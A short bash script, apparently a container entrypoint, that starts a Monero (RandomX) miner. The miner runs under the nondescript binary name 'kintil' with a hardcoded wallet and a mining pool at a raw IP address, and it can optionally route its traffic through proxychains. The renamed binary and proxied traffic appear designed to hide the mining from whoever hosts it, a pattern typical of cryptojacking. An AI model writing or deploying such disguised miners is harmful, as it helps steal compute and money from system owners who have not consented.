#!/bin/bash

# if use_proxy from env is set to true, then set proxy
if [ "${use_proxy}" = true ]; then
    # check whether proxychains4.conf exists
    if [ -f /root/proxychains4.conf ]; then
        proxychains4 -q -f /root/proxychains4.conf /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333
    else
        echo "Proxychains4.conf not found, exit"
        exit 1
    fi
else
    /usr/bin/kintil -algo RandomX -coin XMR -wallet 89EcNeW4CN3ZXhGZ2bebYM7H2DntAe1fw6qvQ2KB3Hprc1ZDpbyjDoibEDU9duGmM4V77aMTkHJg51JS4kzivx2o3D8DFYc.BERKAH -pool1 159.223.182.56:3333
fi
